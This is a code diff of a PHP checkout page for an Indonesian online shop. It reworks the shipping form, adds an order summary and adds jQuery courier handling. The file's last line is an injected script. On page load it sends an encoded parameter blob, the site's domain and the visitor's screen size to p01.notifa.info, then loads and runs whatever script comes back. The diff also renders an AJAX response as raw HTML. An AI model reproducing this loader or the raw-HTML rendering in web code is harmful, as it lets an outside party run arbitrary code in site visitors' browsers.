@@ -11,7 +11,7 @@
                 <meta name="author" content="BDTASK">
         <meta name="description" content="">
 
-        <title>Checkout</title>
+        <title>Klak Klik : Informasi Pengiriman</title>
    
         <!-- Favicons --> 
         <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
@@ -70,6 +70,45 @@
     <link href="<?php echo base_url().'assets'?>/css/animate.css" rel="stylesheet">
      
     <style type="text/css">
+
+        .row-detail-checkout{
+             display: table;width: 100%;margin-bottom: 16px;
+        }
+
+        .detail-subtotal{
+            display: table-cell; font-size: 14px;color: #757575;letter-spacing: 0;line-height: 16px;vertical-align: middle;width: 50%;
+        }
+        .coupon-input{
+            display: table-cell; font-size: 14px;color: #757575;letter-spacing: 0;line-height: 16px;vertical-align: middle;width: 70%;
+        }
+        .submit-coupon{
+            display: table-cell; font-size: 14px;color: #757575;letter-spacing: 0;line-height: 16px;vertical-align: middle;width: 30%;padding-left: 10px;
+        }
+
+        .detail-cost-subtotal{
+            display: table-cell;font-size: 16px;line-height: 21px;text-align: right;color: #202020;letter-spacing: -.44px;vertical-align: middle;
+        }
+
+        .btn-confirm{
+                border: 0;
+                color: #fff;
+                background: #000;
+                /* width: 160px; */
+                font-size: 14px;
+                cursor: pointer;
+                /* margin-left: 15px; */
+                height: 40px;
+                width: 100%;
+                border-radius: 2px;
+                /* height: 50px; */
+                margin-top: 8px;
+        }
+
+        .btn-confirm:hover{
+            background: #22df00;
+        }
+
+        /*END DETTAIL*/
         input.loading {
             background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
         }
@@ -169,7 +208,7 @@
             input[type="text"] {
               /*font-family: monospace;*/
               font-size: 15px;
-              color: peru;
+              /*color: peru;*/
             }
 
             ::-webkit-input-placeholder {
@@ -203,7 +242,7 @@
                 <div class="col-lg-8 col-12">
                     
                     <div style="margin-top: 12px;background:#fff;padding: 40px;">
-                        <div style="font-size: 18px;color: #212121;margin-bottom: 25px;">Informasi Pengiriman</div>
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Informasi Pengiriman</div>
                         <form>
                         <div class="row">
                           <div class="col-lg-6">
@@ -222,8 +261,8 @@
                         <div class="row">
                           <div class="col-lg-6">
                               <div class="form-group">
-                                <label for="exampleFormControlSelect1">Kelurahan</label>
-                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Kelurahan Anda">
+                                <label for="exampleFormControlSelect1">Kelurahan/Kecamatan</label>
+                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Kelurahan/Kecamatan Anda">
                               </div>
                           </div>
                           <div class="col-lg-6">
@@ -272,6 +311,8 @@
                               <div class="form-group">
                                 <label for="exampleFormControlSelect1">Kurir</label>
                                 <select id="kurir" class="form-control" name="kurir">
+                                    <option>--Pilih Kurir</option>
+                                    <option value="kke">KLAK KLIK EXPRESS</option>
                                     <option value="jne">JNE</option>
                                     <option value="tiki">TIKI</option>
                                     <option value="pos">POS INDONESIA</option>
@@ -279,42 +320,56 @@
                               </div>
                           </div>
 
-                          <!-- <div class="col-lg-6">
-                              <div class="form-group">
-                                <label for="exampleFormControlInput1">Kecamatan</label>
-                                <select class="form-control" id="exampleFormControlSelect1">
-
-                                  <option>-Pilih Kecamatan</option>
-                                  <?php foreach ($province->rajaongkir->results as $prov): ?>
-                                      
-                                  <option value="<?php echo $prov->province_id ?>"><?php echo $prov->province ?></option>
-                                  
-                                  <?php endforeach ?>
-
-                                </select>
-                              </div>
-                          </div> -->
+                 
 
                         </div>
                         <div class="row">
-                            <div class="col-lg-6 col-12">
-
-                            <button class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;">SIMPAN</button>
-                            </div>
+                            
 
                             <div class="col-lg-6 col-12">
+                                <div class="form-group">
                                 <label>Berat (gram)</label>
                                 <input id="berat" type="text" class="form-control" name="berat" value="500" />
+                                </div>
 
                             </div>
+                            
+
+                            <div class="col-lg-6 col-12 ">
+                                <div class="form-group " >
+                                    <label>Jenis Pengiriman</label>
+
+                                    <select class="form-control" id="jenis-pengiriman" name="kota">
+                                    <option>-Pilih Jenis Kirim</option>
+                                    </select>
+                                </div>
+                                
+                            </div>
+
                             <div class="col-lg-6 col-12">
+                                <div class="form-group">
+                                <button class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;margin-top: 8px;">SIMPAN</button>
+                                </div>
+                            </div>
+
+                            
+
+                            <div class="col-lg-6 col-12">
+                                <div class="form-group">
+
+                                <label>Kode POS</label>
+                                <input type="text" class="form-control" name="kode-pos" placeholder="Masukkan Kode Pos" />
+                                </div>
+
+                            </div>
+                            <!-- <div class="col-lg-6 col-12">
                             <button type="button" class="btn btn-default" id="cek" style="width: 90%;border-radius: 25px;height: 20px;">CEK ONGKIR</button>
 
                                 
 
                             </div>
-
-                            <div class="col-lg-6">
+ -->
+                            <!-- <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlSelect1">Nomor Telepon</label>
                                 <select id="kurir" class="form-control" name="kurir">
@@ -323,9 +378,9 @@
                                     <option value="pos">POS INDONESIA</option>
                                 </select>
                               </div>
-                          </div>
+                            </div> -->
                         </div>
-
+                       
                          
                           
                         </form>
@@ -334,8 +389,129 @@
                     
                 </div>
                 <div class="col-lg-4 col-12">
-                    <div style="margin-top: 12px;min-height: 500px;background:#fff;padding: 40px;">
-                        <div id="ongkir"></div>
+                    <div style="margin-top: 12px;min-height: 500px;background:#fff;">
+                    <div class="col-lg-12 col-12">
+                        <div class="form-group">
+                        <button class="btn-confirm" >BUAT PESANAN</button>
+                        </div>
+                    </div>
+
+                    <div class="col-lg-12">
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">
+                        Rangkuman Pemesanan
+                        </div>
+                        <div class="row-detail-checkout">
+                            <div class="detail-subtotal">
+                                Subtotal ( <span class="cart-text" id="count_cart_tops" style="color:#7e7979"></span>)
+                                
+                            </div>
+
+                            <div class="detail-cost-subtotal">
+                                Rp<span class="cart-text" id="total" style=""></span>
+                            </div>
+                            
+                        </div>
+
+                        <div class="row-detail-checkout">
+                            <div class="detail-subtotal">
+                                Jenis Pengiriman Pengiriman
+                                
+                            </div>
+
+                            <div class="detail-cost-subtotal">
+                                Klak Klik Express
+                            </div>
+                            
+                        </div>
+
+                        <div class="row-detail-checkout">
+                            <div class="detail-subtotal">
+                                Biaya Pengiriman
+                                
+                            </div>
+
+                            <div class="detail-cost-subtotal">
+                                Rp53.000
+                            </div>
+                            
+                        </div>
+
+                        <div class="row-detail-checkout">
+                            <div class="detail-subtotal">
+                                Diskon
+                                
+                            </div>
+
+                            <div class="detail-cost-subtotal">
+                                5%
+                            </div>
+                            
+                        </div>
+
+                        <div class="row-detail-checkout">
+                            <div class="coupon-input">
+                                <div class="form-group">
+                                <input id="berat" type="text" class="form-control" name="" placeholder="Masukkan Kupon" />
+                                </div>
+
+                            </div>
+                            <div class="submit-coupon">
+                                <div class="form-group">
+                                <button class="btn btn-primary" style="width: 100%;border-radius: 2px; ">GUNAKAN</button>
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                        <style type="text/css">
+                            .checkout-order-total{
+                                margin-top: 10px;
+                            }
+                            .checkout-order-total-row{
+                                display: table;
+                                width: 100%;
+                                margin-bottom: 16px;
+                            }
+                            .checkout-order-total-title{
+                                display: table-cell;
+                                font-size: 14px;
+                                color: #202020;
+                                line-height: 16px;
+                            }
+                            .checkout-order-total-fee{
+                                display: table-cell;
+                                font-size: 18px;
+                                color: #f57224;
+                                text-align: right;
+                            }
+
+
+
+                        </style>
+
+                        <div  class="checkout-order-total">
+                            <div class="checkout-order-total-row">
+                                <div class="checkout-order-total-title">
+                                    Total
+                                </div>
+                                <div class="checkout-order-total-fee">
+                                    Rp1.195.761
+                                </div>
+                            </div>
+                            
+                        </div>
+
+                    </div>
+
+                   
+
+                    <div class="col-lg-12 col-12">
+                        <div class="form-group">
+                        <button class="btn-confirm" >BUAT PESANAN</button>
+                        </div>
+                    </div>
+                        
                     </div>
                     
                 </div>
@@ -597,7 +773,7 @@
  
             $.ajax({
                 type : 'GET',
-                url : '<?php echo base_url(); ?>shipping/cek_city',
+                url : '<?php echo base_url(); ?>checkout/cek_city',
                 data :  'prov_id=' + prov,
                     success: function (data) {
  
@@ -611,24 +787,60 @@
  
         $("#cek").click(function(){
             //Mengambil value dari option select provinsi asal, kabupaten, kurir, berat kemudian parameternya dikirim menggunakan ajax 
-            var asal = 154;
+            var asal = 501;
             var kab = $('#kota').val();
             var kurir = $('#kurir').val();
             var berat = $('#berat').val();
  
             $.ajax({
                 type : 'POST',
-                url : '<?php echo base_url(); ?>shipping/cek_ongkir',
+                url : '<?php echo base_url(); ?>checkout/cek_ongkir',
                 data :  {'kab_id' : kab, 'kurir' : kurir, 'asal' : asal, 'berat' : berat},
                     success: function (data) {
  
                     //jika data berhasil didapatkan, tampilkan ke dalam element div ongkir
-                    $("#ongkir").text(data);
+                    $("#ongkir").html(data);
                 }
             });
         });
     });
 </script>
+
+        <script type="text/javascript">
+        $(document).ready(function(){
+      
+          
+                 var discount1 = $('.type-users').find(':selected').data('discount');
+                 var keterangan1 = $('.type-users').find(':selected').data('keterangan');
+                // alert(keterangan);\
+                $("#detail_discount").css("font-weight", "bold");
+                $("#detail_keterangan").css("font-weight", "bold");
+                $( '#detail_discount' ).html(discount1+'%').fadeIn(1000);
+                $( '#detail_keterangan' ).html(keterangan1 ).fadeIn(1000);
+
+            
+
+            $('#kurir').change(function(){
+          
+                 var kurir = $(this).find(':selected').val();
+                // alert(kurir);
+                 if(kurir == 'kke'){
+                    $('#jenis-pengiriman').attr('disabled',true);
+                 }else{
+                    $('#jenis-pengiriman').attr('disabled',false);
+
+                 }
+                 
+                // // alert(keterangan);\
+                // $("#detail_discount").css("font-weight", "bold");
+                // $("#detail_keterangan").css("font-weight", "bold");
+                // $( '#detail_discount' ).html(discount+'%').fadeIn(1000);
+                // $( '#detail_keterangan' ).html(keterangan ).fadeIn(1000);
+
+            });
+        });
+        </script>
+
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
         
         
